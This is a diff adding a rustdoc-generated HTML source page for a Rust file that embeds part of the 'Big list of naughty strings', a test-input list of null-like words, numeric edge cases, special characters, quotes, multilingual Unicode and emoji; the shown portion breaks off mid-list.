@@ -1,0 +1,1089 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="generator" content="rustdoc">
+    <meta name="description" content="Source to the Rust file `src/lib.rs`.">
+    <meta name="keywords" content="rust, rustlang, rust-lang">
+
+    <title>lib.rs.html -- source</title>
+
+    <link rel="stylesheet" type="text/css" href="../../main.css">
+
+    
+    
+</head>
+<body class="rustdoc">
+    <!--[if lte IE 8]>
+    <div class="warning">
+        This old browser is unsupported and will most likely display funky
+        things.
+    </div>
+    <![endif]-->
+
+    
+
+    <nav class="sidebar">
+        
+        
+    </nav>
+
+    <nav class="sub">
+        <form class="search-form js-only">
+            <div class="search-container">
+                <input class="search-input" name="search"
+                       autocomplete="off"
+                       placeholder="Click or press ‘S’ to search, ‘?’ for more options…"
+                       type="search">
+            </div>
+        </form>
+    </nav>
+
+    <section id='main' class="content source"><pre class="line-numbers"><span id="1">  1</span>
+<span id="2">  2</span>
+<span id="3">  3</span>
+<span id="4">  4</span>
+<span id="5">  5</span>
+<span id="6">  6</span>
+<span id="7">  7</span>
+<span id="8">  8</span>
+<span id="9">  9</span>
+<span id="10"> 10</span>
+<span id="11"> 11</span>
+<span id="12"> 12</span>
+<span id="13"> 13</span>
+<span id="14"> 14</span>
+<span id="15"> 15</span>
+<span id="16"> 16</span>
+<span id="17"> 17</span>
+<span id="18"> 18</span>
+<span id="19"> 19</span>
+<span id="20"> 20</span>
+<span id="21"> 21</span>
+<span id="22"> 22</span>
+<span id="23"> 23</span>
+<span id="24"> 24</span>
+<span id="25"> 25</span>
+<span id="26"> 26</span>
+<span id="27"> 27</span>
+<span id="28"> 28</span>
+<span id="29"> 29</span>
+<span id="30"> 30</span>
+<span id="31"> 31</span>
+<span id="32"> 32</span>
+<span id="33"> 33</span>
+<span id="34"> 34</span>
+<span id="35"> 35</span>
+<span id="36"> 36</span>
+<span id="37"> 37</span>
+<span id="38"> 38</span>
+<span id="39"> 39</span>
+<span id="40"> 40</span>
+<span id="41"> 41</span>
+<span id="42"> 42</span>
+<span id="43"> 43</span>
+<span id="44"> 44</span>
+<span id="45"> 45</span>
+<span id="46"> 46</span>
+<span id="47"> 47</span>
+<span id="48"> 48</span>
+<span id="49"> 49</span>
+<span id="50"> 50</span>
+<span id="51"> 51</span>
+<span id="52"> 52</span>
+<span id="53"> 53</span>
+<span id="54"> 54</span>
+<span id="55"> 55</span>
+<span id="56"> 56</span>
+<span id="57"> 57</span>
+<span id="58"> 58</span>
+<span id="59"> 59</span>
+<span id="60"> 60</span>
+<span id="61"> 61</span>
+<span id="62"> 62</span>
+<span id="63"> 63</span>
+<span id="64"> 64</span>
+<span id="65"> 65</span>
+<span id="66"> 66</span>
+<span id="67"> 67</span>
+<span id="68"> 68</span>
+<span id="69"> 69</span>
+<span id="70"> 70</span>
+<span id="71"> 71</span>
+<span id="72"> 72</span>
+<span id="73"> 73</span>
+<span id="74"> 74</span>
+<span id="75"> 75</span>
+<span id="76"> 76</span>
+<span id="77"> 77</span>
+<span id="78"> 78</span>
+<span id="79"> 79</span>
+<span id="80"> 80</span>
+<span id="81"> 81</span>
+<span id="82"> 82</span>
+<span id="83"> 83</span>
+<span id="84"> 84</span>
+<span id="85"> 85</span>
+<span id="86"> 86</span>
+<span id="87"> 87</span>
+<span id="88"> 88</span>
+<span id="89"> 89</span>
+<span id="90"> 90</span>
+<span id="91"> 91</span>
+<span id="92"> 92</span>
+<span id="93"> 93</span>
+<span id="94"> 94</span>
+<span id="95"> 95</span>
+<span id="96"> 96</span>
+<span id="97"> 97</span>
+<span id="98"> 98</span>
+<span id="99"> 99</span>
+<span id="100">100</span>
+<span id="101">101</span>
+<span id="102">102</span>
+<span id="103">103</span>
+<span id="104">104</span>
+<span id="105">105</span>
+<span id="106">106</span>
+<span id="107">107</span>
+<span id="108">108</span>
+<span id="109">109</span>
+<span id="110">110</span>
+<span id="111">111</span>
+<span id="112">112</span>
+<span id="113">113</span>
+<span id="114">114</span>
+<span id="115">115</span>
+<span id="116">116</span>
+<span id="117">117</span>
+<span id="118">118</span>
+<span id="119">119</span>
+<span id="120">120</span>
+<span id="121">121</span>
+<span id="122">122</span>
+<span id="123">123</span>
+<span id="124">124</span>
+<span id="125">125</span>
+<span id="126">126</span>
+<span id="127">127</span>
+<span id="128">128</span>
+<span id="129">129</span>
+<span id="130">130</span>
+<span id="131">131</span>
+<span id="132">132</span>
+<span id="133">133</span>
+<span id="134">134</span>
+<span id="135">135</span>
+<span id="136">136</span>
+<span id="137">137</span>
+<span id="138">138</span>
+<span id="139">139</span>
+<span id="140">140</span>
+<span id="141">141</span>
+<span id="142">142</span>
+<span id="143">143</span>
+<span id="144">144</span>
+<span id="145">145</span>
+<span id="146">146</span>
+<span id="147">147</span>
+<span id="148">148</span>
+<span id="149">149</span>
+<span id="150">150</span>
+<span id="151">151</span>
+<span id="152">152</span>
+<span id="153">153</span>
+<span id="154">154</span>
+<span id="155">155</span>
+<span id="156">156</span>
+<span id="157">157</span>
+<span id="158">158</span>
+<span id="159">159</span>
+<span id="160">160</span>
+<span id="161">161</span>
+<span id="162">162</span>
+<span id="163">163</span>
+<span id="164">164</span>
+<span id="165">165</span>
+<span id="166">166</span>
+<span id="167">167</span>
+<span id="168">168</span>
+<span id="169">169</span>
+<span id="170">170</span>
+<span id="171">171</span>
+<span id="172">172</span>
+<span id="173">173</span>
+<span id="174">174</span>
+<span id="175">175</span>
+<span id="176">176</span>
+<span id="177">177</span>
+<span id="178">178</span>
+<span id="179">179</span>
+<span id="180">180</span>
+<span id="181">181</span>
+<span id="182">182</span>
+<span id="183">183</span>
+<span id="184">184</span>
+<span id="185">185</span>
+<span id="186">186</span>
+<span id="187">187</span>
+<span id="188">188</span>
+<span id="189">189</span>
+<span id="190">190</span>
+<span id="191">191</span>
+<span id="192">192</span>
+<span id="193">193</span>
+<span id="194">194</span>
+<span id="195">195</span>
+<span id="196">196</span>
+<span id="197">197</span>
+<span id="198">198</span>
+<span id="199">199</span>
+<span id="200">200</span>
+<span id="201">201</span>
+<span id="202">202</span>
+<span id="203">203</span>
+<span id="204">204</span>
+<span id="205">205</span>
+<span id="206">206</span>
+<span id="207">207</span>
+<span id="208">208</span>
+<span id="209">209</span>
+<span id="210">210</span>
+<span id="211">211</span>
+<span id="212">212</span>
+<span id="213">213</span>
+<span id="214">214</span>
+<span id="215">215</span>
+<span id="216">216</span>
+<span id="217">217</span>
+<span id="218">218</span>
+<span id="219">219</span>
+<span id="220">220</span>
+<span id="221">221</span>
+<span id="222">222</span>
+<span id="223">223</span>
+<span id="224">224</span>
+<span id="225">225</span>
+<span id="226">226</span>
+<span id="227">227</span>
+<span id="228">228</span>
+<span id="229">229</span>
+<span id="230">230</span>
+<span id="231">231</span>
+<span id="232">232</span>
+<span id="233">233</span>
+<span id="234">234</span>
+<span id="235">235</span>
+<span id="236">236</span>
+<span id="237">237</span>
+<span id="238">238</span>
+<span id="239">239</span>
+<span id="240">240</span>
+<span id="241">241</span>
+<span id="242">242</span>
+<span id="243">243</span>
+<span id="244">244</span>
+<span id="245">245</span>
+<span id="246">246</span>
+<span id="247">247</span>
+<span id="248">248</span>
+<span id="249">249</span>
+<span id="250">250</span>
+<span id="251">251</span>
+<span id="252">252</span>
+<span id="253">253</span>
+<span id="254">254</span>
+<span id="255">255</span>
+<span id="256">256</span>
+<span id="257">257</span>
+<span id="258">258</span>
+<span id="259">259</span>
+<span id="260">260</span>
+<span id="261">261</span>
+<span id="262">262</span>
+<span id="263">263</span>
+<span id="264">264</span>
+<span id="265">265</span>
+<span id="266">266</span>
+<span id="267">267</span>
+<span id="268">268</span>
+<span id="269">269</span>
+<span id="270">270</span>
+<span id="271">271</span>
+<span id="272">272</span>
+<span id="273">273</span>
+<span id="274">274</span>
+<span id="275">275</span>
+<span id="276">276</span>
+<span id="277">277</span>
+<span id="278">278</span>
+<span id="279">279</span>
+<span id="280">280</span>
+<span id="281">281</span>
+<span id="282">282</span>
+<span id="283">283</span>
+<span id="284">284</span>
+<span id="285">285</span>
+<span id="286">286</span>
+<span id="287">287</span>
+<span id="288">288</span>
+<span id="289">289</span>
+<span id="290">290</span>
+<span id="291">291</span>
+<span id="292">292</span>
+<span id="293">293</span>
+<span id="294">294</span>
+<span id="295">295</span>
+<span id="296">296</span>
+<span id="297">297</span>
+<span id="298">298</span>
+<span id="299">299</span>
+<span id="300">300</span>
+<span id="301">301</span>
+<span id="302">302</span>
+<span id="303">303</span>
+<span id="304">304</span>
+<span id="305">305</span>
+<span id="306">306</span>
+<span id="307">307</span>
+<span id="308">308</span>
+<span id="309">309</span>
+<span id="310">310</span>
+<span id="311">311</span>
+<span id="312">312</span>
+<span id="313">313</span>
+<span id="314">314</span>
+<span id="315">315</span>
+<span id="316">316</span>
+<span id="317">317</span>
+<span id="318">318</span>
+<span id="319">319</span>
+<span id="320">320</span>
+<span id="321">321</span>
+<span id="322">322</span>
+<span id="323">323</span>
+<span id="324">324</span>
+<span id="325">325</span>
+<span id="326">326</span>
+<span id="327">327</span>
+<span id="328">328</span>
+<span id="329">329</span>
+<span id="330">330</span>
+<span id="331">331</span>
+<span id="332">332</span>
+<span id="333">333</span>
+<span id="334">334</span>
+<span id="335">335</span>
+<span id="336">336</span>
+<span id="337">337</span>
+<span id="338">338</span>
+<span id="339">339</span>
+<span id="340">340</span>
+<span id="341">341</span>
+<span id="342">342</span>
+<span id="343">343</span>
+<span id="344">344</span>
+<span id="345">345</span>
+<span id="346">346</span>
+<span id="347">347</span>
+<span id="348">348</span>
+<span id="349">349</span>
+<span id="350">350</span>
+<span id="351">351</span>
+<span id="352">352</span>
+<span id="353">353</span>
+<span id="354">354</span>
+<span id="355">355</span>
+<span id="356">356</span>
+<span id="357">357</span>
+<span id="358">358</span>
+<span id="359">359</span>
+<span id="360">360</span>
+<span id="361">361</span>
+<span id="362">362</span>
+<span id="363">363</span>
+<span id="364">364</span>
+<span id="365">365</span>
+<span id="366">366</span>
+<span id="367">367</span>
+<span id="368">368</span>
+<span id="369">369</span>
+<span id="370">370</span>
+<span id="371">371</span>
+<span id="372">372</span>
+<span id="373">373</span>
+<span id="374">374</span>
+<span id="375">375</span>
+<span id="376">376</span>
+<span id="377">377</span>
+<span id="378">378</span>
+<span id="379">379</span>
+<span id="380">380</span>
+<span id="381">381</span>
+<span id="382">382</span>
+<span id="383">383</span>
+<span id="384">384</span>
+<span id="385">385</span>
+<span id="386">386</span>
+<span id="387">387</span>
+<span id="388">388</span>
+<span id="389">389</span>
+<span id="390">390</span>
+<span id="391">391</span>
+<span id="392">392</span>
+<span id="393">393</span>
+<span id="394">394</span>
+<span id="395">395</span>
+<span id="396">396</span>
+<span id="397">397</span>
+<span id="398">398</span>
+<span id="399">399</span>
+<span id="400">400</span>
+<span id="401">401</span>
+<span id="402">402</span>
+<span id="403">403</span>
+<span id="404">404</span>
+<span id="405">405</span>
+<span id="406">406</span>
+<span id="407">407</span>
+<span id="408">408</span>
+<span id="409">409</span>
+<span id="410">410</span>
+<span id="411">411</span>
+<span id="412">412</span>
+<span id="413">413</span>
+<span id="414">414</span>
+<span id="415">415</span>
+<span id="416">416</span>
+<span id="417">417</span>
+<span id="418">418</span>
+<span id="419">419</span>
+<span id="420">420</span>
+<span id="421">421</span>
+<span id="422">422</span>
+<span id="423">423</span>
+<span id="424">424</span>
+<span id="425">425</span>
+<span id="426">426</span>
+<span id="427">427</span>
+<span id="428">428</span>
+<span id="429">429</span>
+<span id="430">430</span>
+<span id="431">431</span>
+<span id="432">432</span>
+<span id="433">433</span>
+<span id="434">434</span>
+<span id="435">435</span>
+<span id="436">436</span>
+<span id="437">437</span>
+<span id="438">438</span>
+<span id="439">439</span>
+<span id="440">440</span>
+<span id="441">441</span>
+<span id="442">442</span>
+<span id="443">443</span>
+<span id="444">444</span>
+<span id="445">445</span>
+<span id="446">446</span>
+<span id="447">447</span>
+<span id="448">448</span>
+<span id="449">449</span>
+<span id="450">450</span>
+<span id="451">451</span>
+<span id="452">452</span>
+<span id="453">453</span>
+<span id="454">454</span>
+<span id="455">455</span>
+<span id="456">456</span>
+<span id="457">457</span>
+<span id="458">458</span>
+<span id="459">459</span>
+<span id="460">460</span>
+<span id="461">461</span>
+<span id="462">462</span>
+<span id="463">463</span>
+<span id="464">464</span>
+<span id="465">465</span>
+<span id="466">466</span>
+<span id="467">467</span>
+<span id="468">468</span>
+<span id="469">469</span>
+<span id="470">470</span>
+<span id="471">471</span>
+<span id="472">472</span>
+<span id="473">473</span>
+<span id="474">474</span>
+<span id="475">475</span>
+<span id="476">476</span>
+<span id="477">477</span>
+<span id="478">478</span>
+<span id="479">479</span>
+<span id="480">480</span>
+<span id="481">481</span>
+<span id="482">482</span>
+<span id="483">483</span>
+<span id="484">484</span>
+<span id="485">485</span>
+<span id="486">486</span>
+<span id="487">487</span>
+<span id="488">488</span>
+<span id="489">489</span>
+<span id="490">490</span>
+<span id="491">491</span>
+<span id="492">492</span>
+</pre><pre class='rust '>
+<span class='doccomment'>/// Big list of naughty strings, implementation detail.</span>
+<span class='doccomment'>/// This is a workaround for rustdoc, which does not escape correctly</span>
+<span class='doccomment'>/// the string literal and exposes naughty javascript.</span>
+<span class='kw'>const</span> <span class='ident'>BLNS_IMPL</span>: <span class='kw-2'>&amp;</span><span class='lifetime'>&#39;static</span> [<span class='kw-2'>&amp;</span><span class='lifetime'>&#39;static</span> <span class='ident'>str</span>] <span class='op'>=</span> <span class='kw-2'>&amp;</span>[
+    <span class='string'>&quot;&quot;</span>,
+    <span class='string'>&quot;undefined&quot;</span>,
+    <span class='string'>&quot;undef&quot;</span>,
+    <span class='string'>&quot;null&quot;</span>,
+    <span class='string'>&quot;NULL&quot;</span>,
+    <span class='string'>&quot;(null)&quot;</span>,
+    <span class='string'>&quot;nil&quot;</span>,
+    <span class='string'>&quot;NIL&quot;</span>,
+    <span class='string'>&quot;true&quot;</span>,
+    <span class='string'>&quot;false&quot;</span>,
+    <span class='string'>&quot;True&quot;</span>,
+    <span class='string'>&quot;False&quot;</span>,
+    <span class='string'>&quot;None&quot;</span>,
+    <span class='string'>&quot;\\&quot;</span>,
+    <span class='string'>&quot;\\\\&quot;</span>,
+    <span class='string'>&quot;0&quot;</span>,
+    <span class='string'>&quot;1&quot;</span>,
+    <span class='string'>&quot;1.00&quot;</span>,
+    <span class='string'>&quot;$1.00&quot;</span>,
+    <span class='string'>&quot;1/2&quot;</span>,
+    <span class='string'>&quot;1E2&quot;</span>,
+    <span class='string'>&quot;1E02&quot;</span>,
+    <span class='string'>&quot;1E+02&quot;</span>,
+    <span class='string'>&quot;-1&quot;</span>,
+    <span class='string'>&quot;-1.00&quot;</span>,
+    <span class='string'>&quot;-$1.00&quot;</span>,
+    <span class='string'>&quot;-1/2&quot;</span>,
+    <span class='string'>&quot;-1E2&quot;</span>,
+    <span class='string'>&quot;-1E02&quot;</span>,
+    <span class='string'>&quot;-1E+02&quot;</span>,
+    <span class='string'>&quot;1/0&quot;</span>,
+    <span class='string'>&quot;0/0&quot;</span>,
+    <span class='string'>&quot;-2147483648/-1&quot;</span>,
+    <span class='string'>&quot;-9223372036854775808/-1&quot;</span>,
+    <span class='string'>&quot;0.00&quot;</span>,
+    <span class='string'>&quot;0..0&quot;</span>,
+    <span class='string'>&quot;.&quot;</span>,
+    <span class='string'>&quot;0.0.0&quot;</span>,
+    <span class='string'>&quot;0,00&quot;</span>,
+    <span class='string'>&quot;0,,0&quot;</span>,
+    <span class='string'>&quot;,&quot;</span>,
+    <span class='string'>&quot;0,0,0&quot;</span>,
+    <span class='string'>&quot;0.0/0&quot;</span>,
+    <span class='string'>&quot;1.0/0.0&quot;</span>,
+    <span class='string'>&quot;0.0/0.0&quot;</span>,
+    <span class='string'>&quot;1,0/0,0&quot;</span>,
+    <span class='string'>&quot;0,0/0,0&quot;</span>,
+    <span class='string'>&quot;--1&quot;</span>,
+    <span class='string'>&quot;-&quot;</span>,
+    <span class='string'>&quot;-.&quot;</span>,
+    <span class='string'>&quot;-,&quot;</span>,
+    <span class='string'>&quot;999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999&quot;</span>,
+    <span class='string'>&quot;NaN&quot;</span>,
+    <span class='string'>&quot;Infinity&quot;</span>,
+    <span class='string'>&quot;-Infinity&quot;</span>,
+    <span class='string'>&quot;INF&quot;</span>,
+    <span class='string'>&quot;1#INF&quot;</span>,
+    <span class='string'>&quot;-1#IND&quot;</span>,
+    <span class='string'>&quot;1#QNAN&quot;</span>,
+    <span class='string'>&quot;1#SNAN&quot;</span>,
+    <span class='string'>&quot;1#IND&quot;</span>,
+    <span class='string'>&quot;0x0&quot;</span>,
+    <span class='string'>&quot;0xffffffff&quot;</span>,
+    <span class='string'>&quot;0xffffffffffffffff&quot;</span>,
+    <span class='string'>&quot;0xabad1dea&quot;</span>,
+    <span class='string'>&quot;123456789012345678901234567890123456789&quot;</span>,
+    <span class='string'>&quot;1,000.00&quot;</span>,
+    <span class='string'>&quot;1 000.00&quot;</span>,
+    <span class='string'>&quot;1\&#39;000.00&quot;</span>,
+    <span class='string'>&quot;1,000,000.00&quot;</span>,
+    <span class='string'>&quot;1 000 000.00&quot;</span>,
+    <span class='string'>&quot;1\&#39;000\&#39;000.00&quot;</span>,
+    <span class='string'>&quot;1.000,00&quot;</span>,
+    <span class='string'>&quot;1 000,00&quot;</span>,
+    <span class='string'>&quot;1\&#39;000,00&quot;</span>,
+    <span class='string'>&quot;1.000.000,00&quot;</span>,
+    <span class='string'>&quot;1 000 000,00&quot;</span>,
+    <span class='string'>&quot;1\&#39;000\&#39;000,00&quot;</span>,
+    <span class='string'>&quot;01000&quot;</span>,
+    <span class='string'>&quot;08&quot;</span>,
+    <span class='string'>&quot;09&quot;</span>,
+    <span class='string'>&quot;2.2250738585072011e-308&quot;</span>,
+    <span class='string'>&quot;,./;\&#39;[]\\-=&quot;</span>,
+    <span class='string'>&quot;&lt;&gt;?:\&quot;{}|_+&quot;</span>,
+    <span class='string'>&quot;!@#$%^&amp;*()`~&quot;</span>,
+    <span class='string'>&quot;\u{3a9}\u{2248}\u{e7}\u{221a}\u{222b}\u{2dc}\u{b5}\u{2264}\u{2265}\u{f7}&quot;</span>,
+    <span class='string'>&quot;\u{e5}\u{df}\u{2202}\u{192}\u{a9}\u{2d9}\u{2206}\u{2da}\u{ac}\u{2026}\u{e6}&quot;</span>,
+    <span class='string'>&quot;\u{153}\u{2211}\u{b4}\u{ae}\u{2020}\u{a5}\u{a8}\u{2c6}\u{f8}\u{3c0}\u{201c}\u{2018}&quot;</span>,
+    <span class='string'>&quot;\u{a1}\u{2122}\u{a3}\u{a2}\u{221e}\u{a7}\u{b6}\u{2022}\u{aa}\u{ba}\u{2013}\u{2260}&quot;</span>,
+    <span class='string'>&quot;\u{b8}\u{2db}\u{c7}\u{25ca}\u{131}\u{2dc}\u{c2}\u{af}\u{2d8}\u{bf}&quot;</span>,
+    <span class='string'>&quot;\u{c5}\u{cd}\u{ce}\u{cf}\u{2dd}\u{d3}\u{d4}\u{f8ff}\u{d2}\u{da}\u{c6}\u{2603}&quot;</span>,
+    <span class='string'>&quot;\u{152}\u{201e}\u{b4}\u{2030}\u{2c7}\u{c1}\u{a8}\u{2c6}\u{d8}\u{220f}\u{201d}\u{2019}&quot;</span>,
+    <span class='string'>&quot;`\u{2044}\u{20ac}\u{2039}\u{203a}\u{fb01}\u{fb02}\u{2021}\u{b0}\u{b7}\u{201a}\u{2014}\u{b1}&quot;</span>,
+    <span class='string'>&quot;\u{215b}\u{215c}\u{215d}\u{215e}&quot;</span>,
+    <span class='string'>&quot;\u{401}\u{402}\u{403}\u{404}\u{405}\u{406}\u{407}\u{408}\u{409}\u{40a}\u{40b}\u{40c}\u{40d}\u{40e}\u{40f}\u{410}\u{411}\u{412}\u{413}\u{414}\u{415}\u{416}\u{417}\u{418}\u{419}\u{41a}\u{41b}\u{41c}\u{41d}\u{41e}\u{41f}\u{420}\u{421}\u{422}\u{423}\u{424}\u{425}\u{426}\u{427}\u{428}\u{429}\u{42a}\u{42b}\u{42c}\u{42d}\u{42e}\u{42f}\u{430}\u{431}\u{432}\u{433}\u{434}\u{435}\u{436}\u{437}\u{438}\u{439}\u{43a}\u{43b}\u{43c}\u{43d}\u{43e}\u{43f}\u{440}\u{441}\u{442}\u{443}\u{444}\u{445}\u{446}\u{447}\u{448}\u{449}\u{44a}\u{44b}\u{44c}\u{44d}\u{44e}\u{44f}&quot;</span>,
+    <span class='string'>&quot;\u{660}\u{661}\u{662}\u{663}\u{664}\u{665}\u{666}\u{667}\u{668}\u{669}&quot;</span>,
+    <span class='string'>&quot;\u{2070}\u{2074}\u{2075}&quot;</span>,
+    <span class='string'>&quot;\u{2080}\u{2081}\u{2082}&quot;</span>,
+    <span class='string'>&quot;\u{2070}\u{2074}\u{2075}\u{2080}\u{2081}\u{2082}&quot;</span>,
+    <span class='string'>&quot;\&#39;&quot;</span>,
+    <span class='string'>&quot;\&quot;&quot;</span>,
+    <span class='string'>&quot;\&#39;\&#39;&quot;</span>,
+    <span class='string'>&quot;\&quot;\&quot;&quot;</span>,
+    <span class='string'>&quot;\&#39;\&quot;\&#39;&quot;</span>,
+    <span class='string'>&quot;\&quot;\&#39;\&#39;\&#39;\&#39;\&quot;\&#39;\&quot;&quot;</span>,
+    <span class='string'>&quot;\&quot;\&#39;\&quot;\&#39;\&quot;\&#39;\&#39;\&#39;\&#39;\&quot;&quot;</span>,
+    <span class='string'>&quot;&lt;foo val=\u{201c}bar\u{201d} /&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;foo val=\u{201c}bar\u{201d} /&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;foo val=\u{201d}bar\u{201c} /&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;foo val=`bar\&#39; /&gt;&quot;</span>,
+    <span class='string'>&quot;\u{7530}\u{4e2d}\u{3055}\u{3093}\u{306b}\u{3042}\u{3052}\u{3066}\u{4e0b}\u{3055}\u{3044}&quot;</span>,
+    <span class='string'>&quot;\u{30d1}\u{30fc}\u{30c6}\u{30a3}\u{30fc}\u{3078}\u{884c}\u{304b}\u{306a}\u{3044}\u{304b}&quot;</span>,
+    <span class='string'>&quot;\u{548c}\u{88fd}\u{6f22}\u{8a9e}&quot;</span>,
+    <span class='string'>&quot;\u{90e8}\u{843d}\u{683c}&quot;</span>,
+    <span class='string'>&quot;\u{c0ac}\u{d68c}\u{acfc}\u{d559}\u{c6d0} \u{c5b4}\u{d559}\u{c5f0}\u{ad6c}\u{c18c}&quot;</span>,
+    <span class='string'>&quot;\u{cc26}\u{cc28}\u{b97c} \u{d0c0}\u{ace0} \u{c628} \u{d3b2}\u{c2dc}\u{b9e8}\u{acfc} \u{c45b}\u{b2e4}\u{b9ac} \u{b620}\u{bc29}\u{ac01}\u{d558}&quot;</span>,
+    <span class='string'>&quot;\u{793e}\u{6703}\u{79d1}\u{5b78}\u{9662}\u{8a9e}\u{5b78}\u{7814}\u{7a76}\u{6240}&quot;</span>,
+    <span class='string'>&quot;\u{c6b8}\u{b780}\u{bc14}\u{d1a0}\u{b974}&quot;</span>,
+    <span class='string'>&quot;\u{2070e}\u{20731}\u{20779}\u{20c53}\u{20c78}\u{20c96}\u{20ccf}&quot;</span>,
+    <span class='string'>&quot;\u{30fd}\u{f3c}\u{e88}\u{644}\u{35c}\u{e88}\u{f3d}\u{ff89} \u{30fd}\u{f3c}\u{e88}\u{644}\u{35c}\u{e88}\u{f3d}\u{ff89} &quot;</span>,
+    <span class='string'>&quot;(\u{ff61}\u{25d5} \u{2200} \u{25d5}\u{ff61})&quot;</span>,
+    <span class='string'>&quot;\u{ff40}\u{ff68}(\u{b4}\u{2200}\u{ff40}\u{2229}&quot;</span>,
+    <span class='string'>&quot;__\u{ff9b}(,_,*)&quot;</span>,
+    <span class='string'>&quot;\u{30fb}(\u{ffe3}\u{2200}\u{ffe3})\u{30fb}:*:&quot;</span>,
+    <span class='string'>&quot;\u{ff9f}\u{ff65}\u{273f}\u{30fe}\u{2572}(\u{ff61}\u{25d5}\u{203f}\u{25d5}\u{ff61})\u{2571}\u{273f}\u{ff65}\u{ff9f}&quot;</span>,
+    <span class='string'>&quot;,\u{3002}\u{30fb}:*:\u{30fb}\u{309c}\u{2019}( \u{263b} \u{3c9} \u{263b} )\u{3002}\u{30fb}:*:\u{30fb}\u{309c}\u{2019}&quot;</span>,
+    <span class='string'>&quot;(\u{256f}\u{b0}\u{25a1}\u{b0}\u{ff09}\u{256f}\u{fe35} \u{253b}\u{2501}\u{253b})  &quot;</span>,
+    <span class='string'>&quot;(\u{ff89}\u{ca5}\u{76ca}\u{ca5}\u{ff09}\u{ff89}\u{feff} \u{253b}\u{2501}\u{253b}&quot;</span>,
+    <span class='string'>&quot;( \u{361}\u{b0} \u{35c}\u{296} \u{361}\u{b0})&quot;</span>,
+    <span class='string'>&quot;\u{1f60d}&quot;</span>,
+    <span class='string'>&quot;\u{1f469}\u{1f3fd}&quot;</span>,
+    <span class='string'>&quot;\u{1f47e} \u{1f647} \u{1f481} \u{1f645} \u{1f646} \u{1f64b} \u{1f64e} \u{1f64d} &quot;</span>,
+    <span class='string'>&quot;\u{1f435} \u{1f648} \u{1f649} \u{1f64a}&quot;</span>,
+    <span class='string'>&quot;\u{2764}\u{fe0f} \u{1f494} \u{1f48c} \u{1f495} \u{1f49e} \u{1f493} \u{1f497} \u{1f496} \u{1f498} \u{1f49d} \u{1f49f} \u{1f49c} \u{1f49b} \u{1f49a} \u{1f499}&quot;</span>,
+    <span class='string'>&quot;\u{270b}\u{1f3ff} \u{1f4aa}\u{1f3ff} \u{1f450}\u{1f3ff} \u{1f64c}\u{1f3ff} \u{1f44f}\u{1f3ff} \u{1f64f}\u{1f3ff}&quot;</span>,
+    <span class='string'>&quot;\u{1f6be} \u{1f192} \u{1f193} \u{1f195} \u{1f196} \u{1f197} \u{1f199} \u{1f3e7}&quot;</span>,
+    <span class='string'>&quot;0\u{fe0f}\u{20e3} 1\u{fe0f}\u{20e3} 2\u{fe0f}\u{20e3} 3\u{fe0f}\u{20e3} 4\u{fe0f}\u{20e3} 5\u{fe0f}\u{20e3} 6\u{fe0f}\u{20e3} 7\u{fe0f}\u{20e3} 8\u{fe0f}\u{20e3} 9\u{fe0f}\u{20e3} \u{1f51f}&quot;</span>,
+    <span class='string'>&quot;\u{1f1fa}\u{1f1f8}\u{1f1f7}\u{1f1fa}\u{1f1f8} \u{1f1e6}\u{1f1eb}\u{1f1e6}\u{1f1f2}\u{1f1f8}                                                                                          &quot;</span>,
+    <span class='string'>&quot;\u{1f1fa}\u{1f1f8}\u{1f1f7}\u{1f1fa}\u{1f1f8}\u{1f1e6}\u{1f1eb}\u{1f1e6}\u{1f1f2}&quot;</span>,
+    <span class='string'>&quot;\u{1f1fa}\u{1f1f8}\u{1f1f7}\u{1f1fa}\u{1f1f8}\u{1f1e6}&quot;</span>,
+    <span class='string'>&quot;\u{ff11}\u{ff12}\u{ff13}&quot;</span>,
+    <span class='string'>&quot;\u{661}\u{662}\u{663}&quot;</span>,
+    <span class='string'>&quot;\u{62b}\u{645} \u{646}\u{641}\u{633} \u{633}\u{642}\u{637}\u{62a} \u{648}\u{628}\u{627}\u{644}\u{62a}\u{62d}\u{62f}\u{64a}\u{62f}\u{60c}, \u{62c}\u{632}\u{64a}\u{631}\u{62a}\u{64a} \u{628}\u{627}\u{633}\u{62a}\u{62e}\u{62f}\u{627}\u{645} \u{623}\u{646} \u{62f}\u{646}\u{648}. \u{625}\u{630} \u{647}\u{646}\u{627}\u{61f} \u{627}\u{644}\u{633}\u{62a}\u{627}\u{631} \u{648}\u{62a}\u{646}\u{635}\u{64a}\u{628} \u{643}\u{627}\u{646}. \u{623}\u{647}\u{651}\u{644} \u{627}\u{64a}\u{637}\u{627}\u{644}\u{64a}\u{627}\u{60c} \u{628}\u{631}\u{64a}\u{637}\u{627}\u{646}\u{64a}\u{627}-\u{641}\u{631}\u{646}\u{633}\u{627} \u{642}\u{62f} \u{623}\u{62e}\u{630}. \u{633}\u{644}\u{64a}\u{645}\u{627}\u{646}\u{60c} \u{625}\u{62a}\u{641}\u{627}\u{642}\u{64a}\u{629} \u{628}\u{64a}\u{646} \u{645}\u{627}, \u{64a}\u{630}\u{643}\u{631} \u{627}\u{644}\u{62d}\u{62f}\u{648}\u{62f} \u{623}\u{64a} \u{628}\u{639}\u{62f}, \u{645}\u{639}\u{627}\u{645}\u{644}\u{629} \u{628}\u{648}\u{644}\u{646}\u{62f}\u{627}\u{60c} \u{627}\u{644}\u{625}\u{637}\u{644}\u{627}\u{642} \u{639}\u{644} \u{625}\u{64a}\u{648}.&quot;</span>,
+    <span class='string'>&quot;\u{5d1}\u{5b0}\u{5bc}\u{5e8}\u{5b5}\u{5d0}\u{5e9}\u{5b4}\u{5c1}\u{5d9}\u{5ea}, \u{5d1}\u{5b8}\u{5bc}\u{5e8}\u{5b8}\u{5d0} \u{5d0}\u{5b1}\u{5dc}\u{5b9}\u{5d4}\u{5b4}\u{5d9}\u{5dd}, \u{5d0}\u{5b5}\u{5ea} \u{5d4}\u{5b7}\u{5e9}\u{5b8}\u{5bc}\u{5c1}\u{5de}\u{5b7}\u{5d9}\u{5b4}\u{5dd}, \u{5d5}\u{5b0}\u{5d0}\u{5b5}\u{5ea} \u{5d4}\u{5b8}\u{5d0}\u{5b8}\u{5e8}\u{5b6}\u{5e5}&quot;</span>,
